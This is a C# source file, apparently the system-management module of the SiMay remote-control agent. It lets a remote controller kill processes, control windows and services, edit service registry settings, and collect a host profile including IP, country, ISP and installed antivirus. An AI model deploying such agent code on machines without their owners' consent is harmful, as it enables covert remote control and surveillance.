using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SiMay.Basic;
using SiMay.Core;
using SiMay.Core.Common;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.Packets;
using SiMay.Core.Packets.SysManager;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Helper;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Windows.Forms;
using static SiMay.ServiceCore.CommonWin32Api;

namespace SiMay.ServiceCore
{
    [ServiceName("系统管理")]
    [ServiceKey(AppJobConstant.REMOTE_SYSMANAGER)]
    public class SystemService : ApplicationRemoteService
    {
        private ComputerInfo _memoryInfo = new ComputerInfo();
        private PerformanceCounter _cpuInfo = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        public override void SessionInited(TcpSocketSaeaSession session)
        {

        }

        public override void SessionClosed()
        {
            this._cpuInfo.Dispose();
        }

        [PacketHandler(MessageHead.S_SYSTEM_KILL)]
        public void TryKillProcess(TcpSocketSaeaSession session)
        {
            var processIds = GetMessageEntity<SysKillPack>(session);
            foreach (var id in processIds.ProcessIds)
            {
                try
                {
                    Process.GetProcessById(id).Kill();
                }
                catch { }
            }

            this.SendProcessList();
        }

        [PacketHandler(MessageHead.S_SYSTEM_MAXIMIZE)]
        public void SetWindowState(TcpSocketSaeaSession session)
        {
            var pack = GetMessageEntity<SysWindowMaxPack>(session);
            int[] handlers = pack.Handlers;
            int state = pack.State;

            if (state == 0)
            {
                for (int i = 0; i < handlers.Length; i++)
                    PostMessage(new IntPtr(handlers[i]), WM_SYSCOMMAND, SC_MINIMIZE, 0);
            }
            else
            {
                for (int i = 0; i < handlers.Length; i++)
                    PostMessage(new IntPtr(handlers[i]), WM_SYSCOMMAND, SC_MAXIMIZE, 0);
            }
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_PROCESS_LIST)]
        public void HandlerGetSystemProcessList(TcpSocketSaeaSession session)
            => this.SendProcessList();


        [PacketHandler(MessageHead.S_SYSTEM_ENUMSESSIONS)]
        public void GetSessionItemHandler(TcpSocketSaeaSession session)
            => SendSessionItem();

        [PacketHandler(MessageHead.S_SYSTEM_CREATE_USER_PROCESS)]
        public void CreateProcessAsUser(TcpSocketSaeaSession session)
        {
            var sessionId = GetMessageEntity<CreateProcessAsUserPack>(session).SessionId;
            UserTrunkContext.UserTrunkContextInstance.CreateProcessAsUser(sessionId);
        }

        private void SendSessionItem()
        {
            var sessions = UserTrunkContext.UserTrunkContextInstance.GetSessionItems()
                .Select(c => new SiMay.Core.Packets.SysManager.SessionItem()
                {
                    UserName = c.UserName,
                    SessionId = c.SessionId,
                    SessionState = c.SessionState,
                    WindowStationName = c.WindowStationName,
                    HasUserProcess = c.HasUserProcess
                })
                .ToArray();

            SendTo(CurrentSession, MessageHead.C_SYSTEM_SESSIONS,
                        new SessionsPack()
                        {
                            Sessions = sessions
                        });
        }

        private void SendProcessList()
        {
            var processList = Process.GetProcesses()
                .OrderBy(p => p.ProcessName)
                .Select(c => new ProcessItem()
                {
                    ProcessId = c.Id,
                    ProcessName = c.ProcessName,
                    ProcessThreadCount = c.Threads.Count,
                    WindowHandler = (int)c.MainWindowHandle,
                    WindowName = c.MainWindowTitle,
                    ProcessMemorySize = ((int)c.WorkingSet64) / 1024,
                    SessionId = c.SessionId,
                    User = "Not",//WTSAPI32.GetUserNameBySessionId(c.SessionId),
                    FilePath = this.GetProcessFilePath(c)
                }).ToArray();

            //processList = processList.Join(GetProcessUserName(), p => p.ProcessId, p => p.Key, (p, n) =>
            //{
            //    p.User = n.Value;
            //    return p;
            //}).ToArray();

            SendTo(CurrentSession, MessageHead.C_SYSTEM_PROCESS_LIST,
                new ProcessListPack()
                {
                    ProcessList = processList
                });
        }
        private string GetProcessFilePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_SYSTEMINFO)]
        public void GetSystemInfosHandler(TcpSocketSaeaSession session)
        {
            ThreadHelper.ThreadPoolStart(c =>
            {
                GeoLocationHelper.Initialize();

                var infos = new List<SystemInfoItem>();
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "主板序列号",
                    Value = SystemInfoHelper.BIOSSerialNumber
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "网卡MAC",
                    Value = SystemInfoHelper.GetMacAddress
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "驱动器存储信息",
                    Value = SystemInfoHelper.GetMyDriveInfo
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "运行目录",
                    Value = Application.ExecutablePath
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "系统版本号",
                    Value = Environment.Version.ToString()
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "启动毫秒",
                    Value = Environment.TickCount.ToString()
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "登录账户",
                    Value = Environment.UserName
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "被控服务启动时间",
                    Value = AppConfiguartion.RunTime
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "系统版本",
                    Value = SystemInfoHelper.GetOSFullName
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "系统核心数",
                    Value = Environment.ProcessorCount.ToString()
                });

                infos.Add(new SystemInfoItem()
                {
                    ItemName = "CPU信息",
                    Value = SystemInfoHelper.GetMyCpuInfo
                });

                infos.Add(new SystemInfoItem()
                {
                    ItemName = "系统内存",
                    Value = (SystemInfoHelper.GetMyMemorySize / 1024 / 1024) + "MB"
                });

                infos.Add(new SystemInfoItem()
                {
                    ItemName = "计算机名称",
                    Value = Environment.MachineName
                });

                infos.Add(new SystemInfoItem()
                {
                    ItemName = "被控服务版本",
                    Value = AppConfiguartion.Version
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "WAN IP",
                    Value = GeoLocationHelper.GeoInfo.Ip
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "LAN IP",
                    Value = SystemInfoHelper.GetLocalIPV4()
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "安全软件",
                    Value = SystemInfoHelper.GetAntivirus()
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "国家",
                    Value = GeoLocationHelper.GeoInfo.Country
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "ISP",
                    Value = GeoLocationHelper.GeoInfo.Isp
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "GPU",
                    Value = SystemInfoHelper.GetGpuName()
                });
                var sysInfos = new SystemInfoPack();
                sysInfos.SystemInfos = infos.ToArray();
                SendTo(CurrentSession, MessageHead.C_SYSTEM_SYSTEMINFO, sysInfos);
            });
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_OCCUPY)]
        public void handlerGetSystemOccupyRate(TcpSocketSaeaSession session)
        {
            string cpuUserate = "-1";
            try
            {
                cpuUserate = ((_cpuInfo.NextValue() / (float)Environment.ProcessorCount)).ToString("0.0") + "%";
            }
            catch { }

            SendTo(CurrentSession, MessageHead.C_SYSTEM_OCCUPY_INFO,
                new SystemOccupyPack()
                {
                    CpuUsage = cpuUserate,
                    MemoryUsage = (_memoryInfo.TotalPhysicalMemory / 1024 / 1024).ToString() + "MB/" + ((_memoryInfo.TotalPhysicalMemory - _memoryInfo.AvailablePhysicalMemory) / 1024 / 1024).ToString() + "MB"
                });
        }


        [PacketHandler(MessageHead.S_SYSTEM_SERVICE_LIST)]
        public void GetServiceList(TcpSocketSaeaSession session) => this.SendServiceList();

        [PacketHandler(MessageHead.S_SYSTEM_SERVICE_START)]
        public void Service_Start(TcpSocketSaeaSession session)
        {
            var serviceItem = GetMessageEntity<ServiceItem>(session);
            try
            {
                using (var sc = new System.ServiceProcess.ServiceController(serviceItem.ServiceName))
                {
                    if (sc.Status.Equals(System.ServiceProcess.ServiceControllerStatus.Stopped))
                    {
                        sc.Start();
                    }
                }
            }
            catch { }

            SendServiceList();

        }

        [PacketHandler(MessageHead.S_SYSTEM_SERVICE_STOP)]
        public void Service_Stop(TcpSocketSaeaSession session)
        {
            var serviceItem = GetMessageEntity<ServiceItem>(session);
            try
            {
                using (var sc = new System.ServiceProcess.ServiceController(serviceItem.ServiceName))
                {
                    if (sc.Status.Equals(System.ServiceProcess.ServiceControllerStatus.Running))
                    {
                        sc.Stop();
                    }
                }
            }
            catch { }

            SendServiceList();

        }

        [PacketHandler(MessageHead.S_SYSTEM_SERVICE_RESTART)]
        public void Service_ReStart(TcpSocketSaeaSession session)
        {
            var serviceItem = GetMessageEntity<ServiceItem>(session);
            try
            {
                using (var sc = new System.ServiceProcess.ServiceController(serviceItem.ServiceName))
                {
                    if (sc.Status.Equals(System.ServiceProcess.ServiceControllerStatus.Stopped))
                    {
                        sc.Start();
                    }
                    if (sc.Status.Equals(System.ServiceProcess.ServiceControllerStatus.Running))
                    {
                        sc.Stop();
                        while (true)
                        {
                            System.Threading.Thread.Sleep(1000);
                            if (sc.Status.Equals(System.ServiceProcess.ServiceControllerStatus.Stopped))
                            {
                                sc.Start();
                                break;
                            }
                        }
                    }
                }
            }
            catch { }

            SendServiceList();

        }

        [PacketHandler(MessageHead.S_SYSTEM_SERVICE_STARTTYPE_SET)]
        public void Service_StartType(TcpSocketSaeaSession session)
        {
            var serviceItem = GetMessageEntity<ServiceItem>(session);
            try
            {
                Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + serviceItem.ServiceName, true)?.SetValue("Start", serviceItem.StartType, RegistryValueKind.DWord);
            }
            catch { }
            SendServiceList();

        }

        private void SendServiceList()
        {
            var serviceList = System.ServiceProcess.ServiceController.GetServices()
                .OrderBy(s => s.ServiceName)
                .Select(c => new ServiceItem()
                {
                    ServiceName = c.ServiceName,
                    DisplayName = c.DisplayName,
                    Description = GetDescription(c.ServiceName),
                    Status = c.Status.ToString(),
                    StartType = c.StartType.ToString(),
                    UserName = GetLoginUserName(c.ServiceName),
                    FilePath = GetImagePath(c.ServiceName)
                }).ToArray();

            SendTo(CurrentSession, MessageHead.C_SYSTEM_SERVICE_LIST,
                new ServiceInfoPack()
                {
                    ServiceList = serviceList
                });
        }

        private string GetDescription(string serviceName)
        {
            string ReturnValue = string.Empty;
            using (var management = new System.Management.ManagementObject(new System.Management.ManagementPath(string.Format("Win32_Service.Name='{0}'", serviceName))))
            {
                try
                {
                    ReturnValue = management["Description"].ToString();
                }
                catch
                {
                    ReturnValue = (string)Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + serviceName)?.GetValue("Description") ?? string.Empty;
                }

            }
            return ReturnValue;
        }
        private string GetLoginUserName(string serviceName)
        {
            return (string)Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + serviceName)?.GetValue("ObjectName") ?? string.Empty;
        }
        private string GetImagePath(string serviceName)
        {
            return (string)Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + serviceName)?.GetValue("ImagePath") ?? string.Empty;
        }
    }
}